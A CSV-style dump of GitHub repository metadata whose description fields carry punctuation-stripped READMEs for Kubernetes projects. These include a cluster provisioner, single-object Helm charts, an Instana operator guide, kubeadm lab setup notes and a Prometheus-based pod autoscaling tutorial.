relenteny,provision-k8s,,Kubernetes Provisioner The objective of this code base is to provide a pattern by which functionality can be added to an existing Kubernetes Cluster It is geared toward personal development test clusters but is capable of configuring just about any type of Kubernetes cluster Currently this version of the provisioning process supports Docker for Windows and Docker for Mac This is based on real world experience working alongside developers who are interested in learning about Docker and find the installation and configuration process for both environments straightforward Some basic testing has been done with minikube but full support is not quite there yet Based on years of experience dealing with environmental issues across local workstation environments the approach taken here is to provision a Kubernetes cluster using a prebuilt Docker image Doing this provides a more stable environment from which a cluster may be configured It s not foolproof but it significantly decreases the challenges faced when trying to provide this type of functionality across a myriad of workstation configurations on multiple operating systems In addition to support the ever advancing state of this technology as part of the provisioning process the Docker image used is built at provisioning time If clusters are re provisioned the Docker image is not rebuilt shortening the time require to re provision a cluster Project Structure text provision k8s ansible Ansible playbook and components using in provisioning the cluster charts local registry Helm chart used to install and configure a local Docker registry images k8s provisioner Docker image built during the provision process and use to provision the cluster scripts scripts used to execute the provisioning process Prerequisites As mentioned above the current provisioning process assumes Docker for Windows or Docker for Mac respectively are installed and that the Kubernetes functionality has been enabled Links to the specific installation packages are found on the Docker website on the Docker Desktop overview https docs docker com desktop page This process has been tested against Docker for Mac Windows 3 0 Resources Kubernetes can be fairly resource intensive Like any other technology it depends on what you ll be doing with it While it may not use all of them it is best to configure as many CPUs as you see practical Configure at least 1 2 the number of CPUs This doesn t pre allocate the number of CPUs to Kubernetes It allows Kubernetes to use the number of CPUs As far as memory goes 4GB is the minimum If you ll be doing anything beyond basic experimentation 8GB would be recommended Similar to the CPUs Kubernetes will not pre allocate the memory It will uses what it needs up to the limit provided Additional Information Docker for Mac Docker for Mac should be configured with a minimum of 6GB RAM allocated git must be available at the command line For a brief time the provisioning script requires sudo root privileges This is to update etc hosts with cluster host information Docker for Windows The Windows provisioning process requires the Windows Subsystem for Linux version 2 WSL2 be installed The script has been validated using the Ubuntu distribution Docker for Windows should be configured with a minimum of 6GB RAM allocated git must be available at the command line For a brief time the provisioning script requires sudo root privileges This is to update etc hosts with cluster host information Ensure the user running the script has sudo privileges The process also updates the Windows hosts file This requires that the WSL2 provisioning process be executing with Windows Administrator privileges There are various methods available to handle this issue The most straightforward is to start the WSL2 session using Run as administrator Once the provisioning process has successfully executed subsequent WSL sessions will not require administrative privileges Once provisioned to interact with the Kubernetes cluster a WSL2 session is not required All functionality will be available from the Windows command line as well If you plan to use Helm from the Windows command line you will need to install it The process is outlined on the Helm website at Installing Helm https helm sh docs intro install Installed Components As outlined in my DZone article link here the intention behind this provisioning process is to configured a Kubernetes cluster with a set of components that make it suitable for development and testing of Kubernetes deployments While the below outlines the components installed and configured by the provisioning process by reviewing the code and the patterns used customizing the process removing or adding to the components installed is straightforward Kubernetes Dashboard The Kubernetes Dashboard https kubernetes io docs tasks access application cluster web ui dashboard is a web based Kubernetes interface From the Kubernetes documentation Dashboard is a web based Kubernetes user interface You can use Dashboard to deploy containerized applications to a Kubernetes cluster troubleshoot your containerized application and manage the cluster resources You can use Dashboard to get an overview of applications running on your cluster as well as for creating or modifying individual Kubernetes resources such as Deployments Jobs DaemonSets etc For example you can scale a Deployment initiate a rolling update restart a pod or deploy new applications using a deploy wizard Dashboard also provides information on the state of Kubernetes resources in your cluster and on any errors that may have occurred Cluster Ingress Controller For most applications ingress resources are an important aspect of configuration and deployment A cluster ingress controller provides the base support for using Kubernetes Ingresses https kubernetes io docs concepts services networking ingress Metrics Server The Kubernetes Metrics Server https github com kubernetes sigs metrics server is used to gather information on cluster resources to aid in auto scaling orchestration Private Docker Registry Most users familiar with the container ecosystem understand that a Docker Registry is an important Kubernetes deployment and orchestration component There are several cloud based Docker registries available for use Based on use case the cloud providers do have some downsides and restrictions To that end the provisioning process deploys and configures a private Docker Registry providing basic support for development and deployment uses ChartMuseum Helm https helm sh has become an integral part of many Kubernetes deployment pipelines Similar to a Docker Registry Helm also uses a repository for artifact storage The cluster is configured with ChartMuseum https chartmuseum com as the local Helm repository Kubeapps Kubeapps https kubeapps com provides a web based front end to Helm repositories and operations This instance of Kubeapps is configured for access to the local Helm repository backed by ChartMuseum as well as common public repositories Prometheus For Kubernetes Prometheus https prometheus io has become a predominant metrics and alerting system When installing and configuring Prometheus in a Kubernetes cluster multiple patterns exist This provisioning process installs and configures the Prometheus Operator including a Grafana https grafana com front end configured to interact with the Prometheus data source Executing the Provisioning Process While this process has been vetted across multiple systems on Both Windows and MacOS there are serval aspects that make assumptions regarding environment Some are described above in the Prerequisites section The vast majority of environmental and operating system specific issues are addressed by executing the provisioning process from within a Docker container To execute the provisioning process use the following command Download the provisioning script from scripts provision k8s sh Make the script executable chmod x provision k8s sh Execute the script provision k8s sh The provision process creates a README file in HOME kubernetes docker desktop Upon successful operation it will contain information regarding the outcome of the process including links that can be used to access installed components The provisioning process also supports removing the installed components It can be executed using the following invocation Using the same script execute provision k8s sh remove Notes on Executing the Process At times while executing the process you will see output similar to this fatal 127 0 0 1 FAILED censored the output has been hidden due to the fact that nolog true was specified for this result changed true These errors can be ignored In these cases the script is hiding error output that it s expecting The process can be executed multiple times For example if while running the process you experience something like a network outage you can simply run the script again It will pick up where it left off,2020-12-15T00:51:55Z,2020-12-19T23:14:12Z,Shell,User,1,2,1,4,main,relenteny,1,0,1,0,0,0,0
sunpong,k8s-learning,,k8s learning 1 docker network dcoker md 2 docker network docker md 3 falnnelvxlan 4 1 kubelet 2 client go k8s api7 3 4,2020-08-29T16:49:53Z,2020-09-02T23:25:17Z,n/a,User,1,2,0,23,master,sunpong,1,0,0,0,0,0,0
sabattle,k8s-app,,k8s app,2020-11-16T14:38:28Z,2020-11-29T23:19:48Z,Smarty,User,2,2,1,16,main,sabattle,1,0,0,0,0,0,0
ameijer,k8s-as-helm,,Artifact HUB https img shields io endpoint url https artifacthub io badge repository k8s as helm https artifacthub io packages search repo k8s as helm Kubernetes as Helm k8s as helm Introduction Helm https helm sh is Kubernetes package manager Use helm charts to quickly install software into your cluster manage upgrades and so forth Helm is powerful but sometimes users of helm charts need a bit of extra functionality that wasn t included in the original chart they obtain from a third party Users can fork and modify the original helm chart but this requires maintenance to keep the chart up to date with its upstream source chart Alternatively users can directly define using Kubernetes yaml the extra item they need but helm itself has no way to apply single Kubernetes resources alone If your stack relies heavily on helm or you use tools such as Helmfile https github com roboll helmfile this can require you to implement cumbersome or hacky work arounds just to add a tiny bit of functionality to an otherwise unmodified third party chart K8s as helm was developed to extend Kubernetes primitives up to the helm layer Each chart in this repository is designed to deploy a single Kubernetes API object or in some cases can be configured to deploy small groups of closely related objects Perhaps you need just one extra service to point at your Jenkins deployment so that it can be reached by an un configurable piece of software Deploy a service https github com ameijer k8s as helm tree master charts svc chart alongside the unmodified Jenkins chart No need to fork the chart just to add a single service spec yaml file Maybe the implementer of a chart you are using didn t implement a pod disruption budget for its pods Release a pdb https github com ameijer k8s as helm tree master charts pdb chart to add your own Design Philosophy These charts are designed to set most parts of the API objects to common defaults and require only the bare minimum of configuration from the user to deploy That being said they are also designed to be flexible for more uncommon use cases If one of these charts doesn t expose some functionality you need from the Kubernetes resource that it deploys check out the Contributing contributing section to see how to get that needed functionality exposed for your configuration Repository Structure All of the charts in the repo are located in the charts directory The CICD for this repo is implemented using github actions the code for which can be found in the github directory Road Map Eventually this project will maintain a helm chart for every Kubernetes API object The supported objects are tracked in the table below API Object Status Link Pod TODO ConfigMap heavycheckmark configmap https github com ameijer k8s as helm tree master charts configmap Ingress heavycheckmark ingress https github com ameijer k8s as helm tree master charts ingress PodDisruptionBudget heavycheckmark pdb https github com ameijer k8s as helm tree master charts pdb Secret heavycheckmark secret https github com ameijer k8s as helm tree master charts secret Service heavycheckmark svc https github com ameijer k8s as helm tree master charts svc ReplicaSet TODO ReplicationController TODO StatefulSet TODO Job TODO CronJob TODO Deployment TODO DaemonSet TODO StorageClass TODO Volume TODO HoirizontalPodAutoscaler TODO PodSecurityPolicy TODO ClusterRole TODO ClusterRoleBinding TODO Namespace heavycheckmark namespace https github com ameijer k8s as helm tree master charts namespace PeristentVolume TODO PersistentVolumeClaim heavycheckmark pvc https github com ameijer k8s as helm tree master charts pvc Role TODO RoleBinding TODO ServiceAccount TODO NetworkPolicy heavycheckmark networkpolicy https github com ameijer k8s as helm tree master charts networkpolicy Contributing Contributions are welcome If you find an issue with a chart in here or would like an additional feature to be added please open an issue PRs addressing issues are also welcomed Check out the Road Map road map section Copyright 2020 Alex Meijer,2020-10-17T15:56:30Z,2020-12-12T16:00:25Z,HTML,User,1,2,0,96,master,ameijer,1,25,25,1,0,1,16
kylinxiang70,k8s-in-action,,k8s in action Kubernetes Kubernetes https github com kubernetes kubernetes v1 19 2 example go md Kubernetes https github com kubernetes kubernetes Go How and Why Kubernetes k8s staging staging IDE Debug example md 1 Kubernetes core data structure GVR Group Versions Resource core data structure gvr runtime Object core data structure runtime object Unstructed core data structure unstructed data Scheme core data structure scheme Codec core data structure codec Convert core data structure convertion 2 Kubectl TODO 3 client go client go client client go client kubeconfig client go client kubeconfig RESTClient client go client restclient ClientSet client go client clientset DynamicClient client go client discoveryclient DiscoveryClient client go client discoveryclient informer client go informer Informer client go informer informer arch example md Reflector client go informer reflector md 4 etcd etcd TODO 5 kube apiserver apiserver TODO 6 kube scheduler scheduler TODO 7 kubernetes design pattern TODO 8 util k8s io apimachinery pkg util wait util wait,2020-12-03T14:21:24Z,2020-12-23T15:03:20Z,Go,User,2,2,0,16,master,kylinxiang70,1,0,0,0,0,0,0
tibfab,dss-at-k8s,,Installation guide DSS K8S Todo URL to Medium article,2020-10-30T07:29:53Z,2020-12-28T02:19:23Z,Shell,User,1,2,0,2,master,tibfab,1,0,21,0,0,0,1
CVPaul,rke-k8s-deploy,,Author xianqiuli mail xianqiuli 163 com Created Time Thu 17 Sep 2020 10 41 54 AM CST https zhuanlan zhihu com p 252645539 rke v1 1 7 kube version rancher hyperkube v1 18 8 rancher1 server os ubunutu 20 04 LTS,2020-09-21T09:43:07Z,2020-11-20T05:58:02Z,Shell,User,1,2,1,3,master,CVPaul,1,0,0,0,0,0,0
erkules,k8s-workshop-sharedcluster,,K8s OCP Multitenant Wir haben ein Cluster fr viele Projekte Wie kann der Cluster gemeinsam genutzt geshared werden Wie bekommen wir den Workload so isoliert dass nur wir auf die eigenen Applikationen zugreifen Wie schaffen wir es dass der Cluster und andere Projekte nicht in Gefahr kommen Topics Wir mocken einen User projekt11 Authentication Dieser User wird Admin auf einem Namespace Authorization RBAC Wir begrenzen den Resourcenverbrauch etc in diesem Namespace LimitRange ResourceQuota Wir beschrnken das Netzwerk mit dynamischen Iptables Regeln NetworkPolicies Wir gehen sicher dass Container Pods nur mit reduzierten Rechnten ausgerollt werden drfen PodSecurityPolicies SCC Ablauf Wir mocken einen User projekt11 Authentication kubectl as projekt11 get nodes Dieser User wird Admin auf einem Namespace Authorization RBAC Namespace ist ne Abstraktion aber keine Isolation kubectl create ns projekt11 Namespace anlegen kubectl apply f rolebinding namespaceadmin yaml User projekt11 wird Admin im projekt11 ns kubectl n projekt11 as projekt11 get pods Kein Fehler kubectl n default as projekt11 get pods Fehler gut so Wir erstellen ein Alias faule Leute Sprich kpro ist immer der User projekt11 im Namespace projekt11 alias kpro kubectl n projekt11 as projekt11 kpro apply f deployment yaml Knnen wir ewig skalieren aber funzt kpro delete f deployment yaml Aufrumen Wir begrenzen den Resourcenverbrauch etc in diesem Namespace LimitRange ResourceQuota kubectl apply f resourcequota yaml kubectl apply f limitrange like in prod yaml und aufrumen Wir beschrnken das Netzwerk mit dynamischen Iptables Regeln NetworkPolicies kpro apply f deployment yaml kpro apply f pod yaml kpro exec www wget www projekt11 O kubectl n projekt5 apply f pod yaml kubectl n projekt5 exec www wget www projekt11 O kubectl apply f networkpolicy yaml kpro exec www wget www projekt11 O kubectl n projekt5 exec www wget www projekt11 O aufrumen Wir gehen sicher dass Container Pods nur mit reduzierten Rechnten ausgerollt werden drfen PodSecurityPolicies SCC Siehe AWS README md kpro apply f deployment yml kpro apply f deployment user yaml Einige Reste API Priority Fairness Multus CNI OPA Vortrag geplant PodPriority Hierarchical Namespaces Tenant Virtual Cluster OLM,2020-12-04T03:43:43Z,2020-12-14T15:00:35Z,n/a,User,1,2,0,0,main,,0,0,0,0,0,0,0
robcxyz,demo-k8s-project,,demo k8s project Just a short demo on how to deploy kubernetes cd cluster terraform init terraform apply aws eks region us east 1 update kubeconfig name my cluster cd helm chart tf init tf apply Dependencies aws iam authenticator kubectl awscli terraform helm,2020-09-22T01:20:01Z,2020-10-27T23:51:48Z,HCL,User,1,2,1,6,master,robcxyz,1,0,0,1,0,1,0
ondrejsika,ondrejsika-k8s-prom,,ondrejsika k8s prom Setup Clone repo git clone git github com ondrejsika ondrejsika k8s prom git cd ondrejsika k8s prom Setup helm longhorn consul ingress maildev make helm make longhorn make consul make ingress make maildev Create CRDs make crd Use example configuration values make copy example values Install Prometheus make prom Example Apply example kubectl apply f example Prometheus Service Discovery https prometheus k8s sikademo com service discovery Targets https prometheus k8s sikademo com targets Alerts https prometheus k8s sikademo com alerts Graph https prometheus k8s sikademo com graph g0 rangeinput 1h g0 expr examplerequests g0 tab 1 Grafana URL https grafana k8s sikademo com User admin Password prom operator Our example dashboard https grafana k8s sikademo com d ex01 example dashboard Alert Manager https alertmanager k8s sikademo com Status https alertmanager k8s sikademo com status MailDev Email Client https maildev k8s sikademo com,2020-09-23T05:22:56Z,2020-11-20T17:59:43Z,Makefile,User,1,2,1,6,master,ondrejsika#vojtechmares,2,0,0,0,0,0,2
instana,self-hosted-k8s,,The Operator This is the documentation for the instana operator preview There is already a purely Docker https www docker com based Self Hosted Instana https www instana com docs selfhostedinstana This version doesn t rely on additional cluster technology and only requires a rather beefy machine to run on This type of installation works for most of our customers and require the least amount of operations to keep running and up to date Some customers have to go way beyond these limits to monitor their infrastructure which requires a lot more scalability on our side which a single box can only provide vertically and only to a limit With our recent move to kubernetes https kubernetes io we finally had the chance to provide Self Hosted Instana to a new group of customers Our experiences with kubernetes made it pretty clear that a k8s operator https operatorframework io would be the way to go to handle a highly distributed system like Instana Requirements To get started with the operator you will need a working kubernetes cluster databases to be set up Getting started The following steps are necessary to set up a complete Instana operator setup All necessary objects are defined and created as kubernetes kustomize templating In the respective sections are example of the configurations which can be used as templates for your own for example operator overlays example Required values you need to know There are various placeholders in the overlays AGENTINGRESSIP External IP address for the loadbalancer to which the agents will connect AGENTKEY Key used by agents to connect to Instana BASEDOMAIN Domain registered in the DNS used by the customer BASEURL Might be identical to BASEDOMAIN endpoint for your agent ingress COREINGRESSIP EUM and Serverless ingress endpoint DBHOST If using only a single database machine this has to point to it DOWNLOADKEY Key used for downloading from Instana NAMESPACECORE Name of the namespace where the CORE is running NAMESPACEUNIT Name of the namespace where the UNIT is running NFSHOST Host used as NFS persistent volume for raw spans SALESKEY Customer sales key TENANTNAME Name of the tenant to be created UNITINGRESSIP IP under which UI and API will be reachable UNITNAME Name of the tenant unit to be created Data for the k8s secrets A valid Instana license file which can be downloaded here https instana io onprem license download salesId salesKey tls crt and tls key for the base domain Pregenerated dhparams pem for nginx If saml should be configured the saml pem file and the pass for the private key record First admin pass Instana AgentKey DownloadKey for the registry access Operator deployment First of all the operator with its custom resources should be created in the cluster We recommend having separate namespaces for the operator such as the core and the units For this copy the folder operator overlays example Open for edit operator overlays namespace yaml and insert your operator namespace name Open for edit operator overlays secrets dockerconfigjson and put Instana registry credentials into the corresponding fields Now you can run kubectl apply k inside the folder and afterwards the operator should be available in the cluster Namespace core Next up is the core namespace The core should preferably be deployed in a separate namespace A core can serve several units The overlay directory should also be copied into a separate directory The core needs a number of files secrets and values kustomization yaml for the necessary secrets The secret names instana secrets and instana registry are fix and can not be adjusted For namespace creation adjust the corresponding namespace yaml Furthermore the databases can be defined and created as services For this purpose adjust the corresponding service yaml files with the right values Now everything can be applied into the kubernetes cluster with kubectl apply k Namespace unit A unit namespace can contain several or a single unit installations The overlay directory should also be copied into a separate directory The unit needs a number of files secrets and values kustomization yaml for the necessary secrets The secret names instana secrets and instana registry can not be adjusted For namespace creation adjust the corresponding namespace yaml Now everything can be applied into the kubernetes cluster with kubectl apply k Backend core Now it is the time for the backends first there must be a running core Under backend core overlays example there are also templates for the core configuration Now fill the necessary custom resource templates with values and list them in the kustomization yaml as patch files It is not possible to adjust the base name instana core instead you can add a custom nameSuffix Afterwards everything can be applied into the kubernetes cluster with kubectl apply k Backend unit As in the core all necessary values should be entered in the custom templates It is not possible to adjust the base name instana unit instead you can add a custom nameSuffix Afterwards everything can be applied into the kubernetes cluster with kubectl apply k Scaling An automated horizontal scaling of Instana deployments is currently not supported With manual scaling higher load scenarios can be realized but there are strict rules for this There are components that cannot be scaled for design reasons Scaling these components can lead to the entire system being unusable There are component groups which have to be scaled together to enlarge certain data piplines Infra Metrics Appdata Spans Eum Beacon Serverless The scaling of certain components must be done in accordance with an appropriately scaled database backend The relationship between core and tenant unit components must also be in balance Using kubectl the respective deployments can be adapted as follows kubectl scale deployments appdata writer replicas 2 kubectl scale tu TENANTNAME UNITNAME appdata processor replicas 3 Vertical scaling is possible by using the profile size of the core and unit specs This profile sizes can be used to determine fixed values for resource requirements in order to setup smaller or larger units Scaling appdata processing pipeline The following components are responsible for processing the Appdata pipeline In the core namespace the replicas of appdata writer should reflect the number of Clickhouse nodes Furthermore the size of the Spans Cassandra cluster is the limiting factor here As a rough guideline we can say that per Cassandra Node about 20000 Span sec can be processed A sufficient bandwidth must also be provided for the storage of the raw traces A high number of spans in a specific unit can be compensated by increasing the TENANTNAME UNITNAME appdata processor Scaling metric processing pipeline Scaling agent ingress Capabilites Our operator is built on the concept of persistent finite state machines This allows us to manage the state of Instana in a persistent resilient and reliable way It also allows deep insights into what is currently going on in the cluster and easy reproducability of problems ans various scenarios Currently implemented This current preview deliver the following capabilities install Instana into an existing k8s cluster take care of migrating and verifying databases required by Instana repair broken deployments and configs update deployments and configs manage an arbitrary number of tenants and tenant units support multiple Instana installations in the same cluster Building blocks CRDs Custom Resource Definitions are extensions of the kubernetes api They allow to add new resources and let those be controlled by an operastor In our case we created two CRDs for the different aspects of Instana in k8s cores instana io A core represents all components shared by an Instana installation Each core has a set of associated databases which will be used by the core itself and all tenants with their respective tenant units created as members of the core The operator supports multiple cores in the same kubernetes cluster units instana io Units represent individual data pools in Instana A unit could represent a department sre dev qa an area development staging production or any other logical grouping required by the customer Data from one unit is not visible by any other unit Above the TUs is the tenant allowing further grouping The tenant only appears as a logical construct and allows to define certain common properties for all its TUs e g authentication RBAC The operator supports the creation of an arbitrary number of TUs across an arbitrary number of namespaces for an arbitrary number of cores Operator The operator itself is provided as a docker image containers instana io instana erelease selfhosted operator This image and all its versions are availabale from our container registry containers instana io containers instana io The actual implementation follows the operator pattern and is based on the operator sdk https operatorframework io After installation into the cluster it will take care of all changes to the aforementioned CRDs and create update delete cores and units The operator is resilient against interruptions restarts by relying on constant evaluation of the cluster state and persisten FSMs to manage long running processes Namespaces In the following paragraphs you will find a recommended layout of namespaces for running Instana https www instana com on Kubernetes The following paragraphs will be based on this image Namespace Layout images namespacestructure jpg operator namespace The operator should get its own namespace where it will create delete various configmaps during its lifetime Theses configmaps represent the persistent state of state machines used to interact with Instana installations The operator doesn t expose anything outside its namespace All interactions happen indirectly via creating updating deleting the unit core CRs core namespace A core namespace contains all the shared components The most important ones being acceptor The acceptor is the main entry point for the Instana agent and receives raw TCP traffic eum acceptor The End UserMonitoring acceptor receives HTTP traffic coming from the EUM scripts injected into your webapps serverless acceptor The serverless acceptor receives HTTP traffic containing metrics traces from your serverless applications butler This is the Instana IdP handling all things security athentication authorization related It exposes the SignIn pages via HTTP After a core has been created the components mentioned above have to be exported outside the cluster butler eum acceptor serverless acceptor have an component called ingress not a kubernetes ingress in front of them Expose this component via a loadbalancer to be able to bind it to a static IP yaml apiVersion v1 kind Service metadata name loadbalancer core spec externalTrafficPolicy Cluster ports name secure port 443 protocol TCP targetPort 443 name plain port 80 protocol TCP targetPort 80 selector application instana component ingress core group service sessionAffinity None type LoadBalancer Exposing Acceptor The acceptor does its own TLS termination and traffic handling Option 1 Expose with a separate loadbalancer yaml apiVersion v1 kind Service metadata name loadbalancer agent spec externalTrafficPolicy Cluster ports name service port 443 protocol TCP targetPort 8600 selector application instana component acceptor group service sessionAffinity None type LoadBalancer Option 2 Expose as NodePort To expose the service as a NodePort use the following definiton yaml apiVersion v1 kind Service metadata name external acceptor service namespace instana core spec type NodePort selector application instana component acceptor componentgroup core group service ports port 8600 targetPort 8600 nodePort 30006 name service Since most external load balancers rely on health checks to verify the availabilty of a service you will also have to expose the health port yaml apiVersion v1 kind Service metadata name external acceptor health namespace instana core spec type NodePort selector application instana component acceptor componentgroup core group service ports port 8601 targetPort 8601 nodePort 30007 name service Option 3 Expose as HostPort Sometimes it is required to expose the accpetor via a higher port range than allowed via a NodePort Under such circumstances a more invasive approach has to be taken to expose acceptor A HostPort allows to expose a service directly to the network outside k8s To allow this we introduced an environment variable called ACCEPTORHOSTPORT This ENV has to be set for the operator pods If present the specified port will be used to publish acceptor directly to the host under the specified port Additionally the health endpoint will be reachable via 8601 also as a host port This bypasses the whole k8s network stack and we won t be able to check if the port is free on all nodes Since most external load balancers rely on health checks to verify the availabilty of a serivce you will also have to expose the health port tu namespace The operator supports multiple namespaces with an arbitrary number of TUs being deployed in each one After creating a unit CR in the namespace the operator will kick in and deploy the components required There are two types of components being deployed in TU namespace The actual TU components where at least one instance per TU has to exist They will be removed when their unit CR instance is removed components that are only required once for all TUs running in a certain namespace They will be removed only when the namespace or the associated core is being removed A tu namespace contains a service called ingress this is NOT a kubernetes ingress which coordinates all requests to the different TUs It is this service that has to be made available outside the cluster In the current iteration this should happen with a LoadBalancer to allow the binding of a static IP to a DNS name see chapter on DNS dns yaml apiVersion v1 kind Service metadata name loadbalancer unit spec externalTrafficPolicy Cluster ports name secure port 443 protocol TCP targetPort 443 name plain port 80 protocol TCP targetPort 80 selector application instana component ingress group service sessionAffinity None type LoadBalancer Install database host with instana console For small to medium k8s installations we offer the possibility of setting up a database host using instana console With this method single node database instances are installed and started as docker images on the target host These only need to be defined as k8s services and can then be used as database layers for Instana Install instana console First the latest instana console must be installed on the target host as explained here https www instana com docs selfhostedinstana installation Configure settings hcl The settings hcl is the configuration file for the setup process hcl type single db hostname extern resolvable hostname dir metrics mnt metrics cassandra data dir traces mnt traces clickhouse data d,2020-09-10T13:04:17Z,2020-11-24T17:18:19Z,Shell,Organization,29,2,1,98,release-191,marbon#schmidtl#codepitbull#EWachnowezki#wait-io#Dalje-et,6,0,0,0,0,0,5
237summit,k8s_core_labs,,Kubernetes Single Master Multi node Kubernets HOST IP address arch CPU Memory OS master example com 10 100 0 104 X8664 2core 4GiB CentOS 7 6 node1 example com 10 100 0 101 X8664 2core 2GiB CentOS 7 6 node2 example com 10 100 0 102 X8664 2core 2GiB CentOS 7 6 node3 example com 10 100 0 103 X8664 2core 2GiB CentOS 7 6 1 Docker Install master node1 node2 node3 docs docker com https docs docker com engine install centos yum install y yum utils yum config manager add repo https download docker com linux centos docker ce repo yum install docker ce docker ce cli containerd io systemctl start docker systemctl enable docker docker version Client Docker Engine Community Version 19 03 8 API version 1 40 Go version go1 12 17 Git commit afacb8b Built Wed Mar 11 01 27 04 2020 OS Arch linux amd64 Experimental false Server Docker Engine Community Engine Version 19 03 8 API version 1 40 minimum version 1 12 Go version go1 12 17 Git commit afacb8b Built Wed Mar 11 01 25 42 2020 OS Arch linux amd64 Experimental false containerd Version 1 2 13 GitCommit 7ad184331fa3e55e52b890ea95e65ba581ae3429 runc Version 1 0 0 rc10 GitCommit dc9208a3303feef5b3839f4323d9beb36df0a9dd docker init Version 0 18 0 GitCommit fec3683 2 kubeadm kubectl kubelet master node1 node2 node3 kubeadm kubectl kubelet kubernetes io https kubernetes io docs setup production environment tools kubeadm install kubeadm 1 Swap disabled swapoff a sed i swap s etc fstab 2 Letting iptables see bridged traffic cat etc sysctl d k8s conf net bridge bridge nf call ip6tables 1 net bridge bridge nf call iptables 1 EOF sysctl system 3 Disable firewall systemctl stop firewalld systemctl disable firewalld 4 Set SELinux in permissive mode effectively disabling it setenforce 0 sed i s SELINUX enforcing SELINUX permissive etc selinux config 5 kubeadm kubelet kubectl cat etc yum repos d kubernetes repo kubernetes name Kubernetes baseurl https packages cloud google com yum repos kubernetes el7 x8664 enabled 1 gpgcheck 1 repogpgcheck 1 gpgkey https packages cloud google com yum doc yum key gpg https packages cloud google com yum doc rpm package key gpg exclude kubelet kubeadm kubectl EOF yum install y kubelet kubeadm kubectl disableexcludes kubernetes systemctl start kubelet systemctl enable kubelet 3 Master master Creating a single control plane cluster with kubeadm kubeadm init To start using your cluster you need to run the following as a regular user mkdir p HOME kube sudo cp i etc kubernetes admin conf HOME kube config sudo chown id u id g HOME kube config kubeadm join 10 100 0 104 6443 token 1ou05o kkist9u6fbc2uhp3 discovery token ca cert hash sha256 8d9a7308ea6ff73 576c112f326690 kubeadm init master kubernetes mkdir cp chown kubernetes mkdir p HOME kube sudo cp i etc kubernetes admin conf HOME kube config sudo chown id u id g HOME kube config kubeadm init kubeadm join worker node master cat token tx kubeadm join 10 100 0 104 6443 token 1ou05o kk 3 discovery token ca cert hash sha256 8d9a7308ea6ff73 576c112f326690 Installing a Pod network add on Weave Net works kubectl apply f https cloud weave works k8s net k8s version kubectl version base64 tr d n kubectl get nodes 4 Worker Node node1 node2 node3 master kubeadm init kubeadm join 10 100 0 104 6443 token 1ou05o kk 3 discovery token ca cert hash sha256 8d9a7308ea6ff73 576c112f326690 kubectl kubectl get nodes NAME STATUS ROLES AGE VERSION master example com Ready master 10m v1 18 0 node1 example com Ready 17m v1 18 0 node2 example com Ready 17m v1 18 0 node3 example com Ready 17m v1 18 0 5 bash shell TAB kubernetes command source kubectl completion bash echo source bashrc 6 yaml nginx 1 example yaml cat example yaml apiVersion apps v1 kind Deployment metadata name deploy exam spec replicas 1 selector matchLabels app nginx template metadata labels app nginx spec containers name nginx image nginx 2 yaml nginx kubectl create f example yaml 3 deploy kubectl get deploy 4 depoy child replicaset pod kubectl get rs kubectl get pod Pod 5 Pod 5 kubectl scale deploy deploy exam replicas 5 kubectl get pod kubectl get pod o wide 4 deploy kubectl delete deploy deploy exam,2020-10-16T11:58:32Z,2020-12-01T05:29:32Z,HTML,User,1,2,0,1,main,237summit,1,0,0,0,0,0,0
xishengcai,k8s-prom-hpa,,k8s prom hpa Autoscaling is an approach to automatically scale up or down workloads based on the resource usage Autoscaling in Kubernetes has two dimensions the Cluster Autoscaler that deals with node scaling operations and the Horizontal Pod Autoscaler that automatically scales the number of pods in a deployment or replica set The Cluster Autoscaling together with Horizontal Pod Autoscaler can be used to dynamically adjust the computing power as well as the level of parallelism that your system needs to meet SLAs While the Cluster Autoscaler is highly dependent on the underling capabilities of the cloud provider that s hosting your cluster the HPA can operate independently of your IaaS PaaS provider The Horizontal Pod Autoscaler feature was first introduced in Kubernetes v1 1 and has evolved a lot since then Version 1 of the HPA scaled pods based on observed CPU utilization and later on based on memory usage In Kubernetes 1 6 a new API Custom Metrics API was introduced that enables HPA access to arbitrary metrics And Kubernetes 1 7 introduced the aggregation layer that allows 3rd party applications to extend the Kubernetes API by registering themselves as API add ons The Custom Metrics API along with the aggregation layer made it possible for lstack system systems like Prometheus to expose application specific metrics to the HPA controller The Horizontal Pod Autoscaler is implemented as a control loop that periodically queries the Resource Metrics API for core metrics like CPU memory and the Custom Metrics API for application specific metrics Overview https github com stefanprodan k8s prom hpa blob master diagrams k8s hpa png What follows is a step by step guide on configuring HPA v2 for Kubernetes 1 9 or later You will install the Metrics Server add on that supplies the core metrics and then you ll use a demo app to showcase pod autoscaling based on CPU and memory usage In the second part of the guide you will deploy Prometheus and a custom API server You will register the custom API server with the aggregator layer and then configure HPA with custom metrics supplied by the demo application Before you begin you need to install Go 1 8 or later and clone the k8s prom hpa https github com stefanprodan k8s prom hpa repo in your GOPATH bash cd GOPATH git clone https github com xishengcai k8s prom hpa sh genert cert sh Setting up the Metrics Server The Kubernetes Metrics Server https github com kubernetes incubator metrics server is a cluster wide aggregator of resource usage data and is the successor of Heapster https github com kubernetes heapster The metrics server collects CPU and memory usage for nodes and pods by pooling data from the kubernetes summaryapi The summary API is a memory efficient API for passing data from Kubelet cAdvisor to the metrics server Metrics Server https github com stefanprodan k8s prom hpa blob master diagrams k8s hpa ms png If in the first version of HPA you would need Heapster to provide CPU and memory metrics in HPA v2 and Kubernetes 1 8 only the metrics server is required with the horizontal pod autoscaler use rest clients switched on The HPA rest client is enabled by default in Kubernetes 1 9 GKE 1 9 comes with the Metrics Server pre installed Deploy the Metrics Server in the kube system namespace bash kubectl create f metrics server After one minute the metric server starts reporting CPU and memory usage for nodes and pods View nodes metrics bash kubectl get raw apis metrics k8s io v1beta1 nodes jq View pods metrics bash kubectl get raw apis metrics k8s io v1beta1 pods jq Setting up a Custom Metrics Server In order to scale based on custom metrics you need to have two components One component that collects metrics from your applications and stores them the Prometheus https prometheus io time series database And a second component that extends the Kubernetes custom metrics API with the metrics supplied by the collect the k8s prometheus adapter https github com DirectXMan12 k8s prometheus adapter Custom Metrics Server https github com stefanprodan k8s prom hpa blob master diagrams k8s hpa prom png You will deploy Prometheus and the adapter in a dedicated namespace Create the lstack system namespace bash kubectl create f namespaces yaml Deploy the Prometheus custom metrics API adapter bash kubectl create f custom metrics api List the custom metrics provided by Prometheus bash kubectl get raw apis custom metrics k8s io v1beta1 jq Get the httprequest for all the pods in the lstack system namespace bash kubectl get raw apis custom metrics k8s io v1beta1 namespaces default services istiorequestspermin jq json kind MetricValueList apiVersion custom metrics k8s io v1beta1 metadata selfLink apis custom metrics k8s io v1beta1 namespaces default services 2A 